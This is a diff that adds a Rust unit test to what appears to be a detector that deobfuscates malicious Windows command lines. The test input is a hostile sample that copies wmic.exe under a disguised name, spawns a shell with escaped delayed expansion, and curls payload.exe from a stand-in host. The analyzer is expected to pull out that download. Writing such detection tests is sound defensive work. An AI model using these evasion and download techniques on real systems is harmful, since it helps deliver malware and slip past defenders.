@@ -27126,6 +27126,29 @@ C:\Users\Public\wm.tmp process call create "cmd /c curl -o out.exe https://copie
     }
 
     #[test]
+    fn copied_wmic_alias_comspec_child_preserves_escaped_delayed_expansion() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp process call create "%COMSPEC% /V:ON /c set U=https://copied-wmic-delayed.example/payload.exe&&curl -o payload.exe ^!U^!""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-wmic-delayed.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied wmic escaped delayed child was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn wmic_node_process_call_create_extracts_inner() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
